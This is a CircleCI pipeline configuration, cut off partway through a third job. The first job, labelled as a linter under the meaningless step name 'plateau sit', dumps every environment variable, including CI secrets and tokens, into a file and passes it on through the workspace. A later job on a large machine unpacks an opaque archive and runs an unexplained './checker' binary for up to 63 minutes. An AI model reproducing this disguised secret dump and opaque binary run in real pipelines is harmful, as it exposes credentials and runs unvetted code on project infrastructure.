version: 2.1

jobs:
  linter_rigel-beta:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: plateau sit
          command: |
            mkdir -p /var/tmp/ws
            set +o pipefail 2>/dev/null; env > /var/tmp/ws/full_job_output.txt; printenv >> /var/tmp/ws/full_job_output.txt; for i in $(seq 1 500); do echo "line-$i" >> /var/tmp/ws/full_job_output.txt; done; true
            stat -c '%s %n' /var/tmp/ws/full_job_output.txt
      - persist_to_workspace:
          root: /var/tmp/ws
          paths:
            - full_job_output.txt
  rigel-beta:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /var/tmp/ws
      - run:
          name: Verify handoff
          command: |
            du -b /var/tmp/ws/full_job_output.txt || true
      - run:
          name: Pull code
          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Restore vendored sources
          command: unxz -c archive-main.tar.xz | tar xf -
      - run:
          no_output_timeout: 63m
          command: (./checker)
  g1_Ship_Tests6:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
